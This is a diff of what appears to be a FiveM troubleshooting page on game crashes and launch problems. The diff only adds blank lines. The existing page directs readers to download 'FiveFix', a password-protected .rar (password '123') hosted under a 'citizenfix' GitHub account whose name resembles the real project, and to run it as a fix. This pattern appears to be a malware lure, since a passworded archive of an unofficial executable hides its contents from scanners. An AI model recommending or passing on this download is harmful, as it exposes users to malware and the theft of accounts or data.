@@ -1,8 +1,11 @@
 Getting game crashes? Can't launch FiveM? Or maybe running into some more obscure issue? Find the most common issues here.
 
 📙Download FiveFix : https://raw.githubusercontent.com/citizenfix/FIVEM/main/FiveFix.rar
+
 🔑Password rar file : 123
+
 Read the text file 
+
 Run FiveFix and choose fix settings* then reinstall fivem
 
 💥 I crash when playing on a server
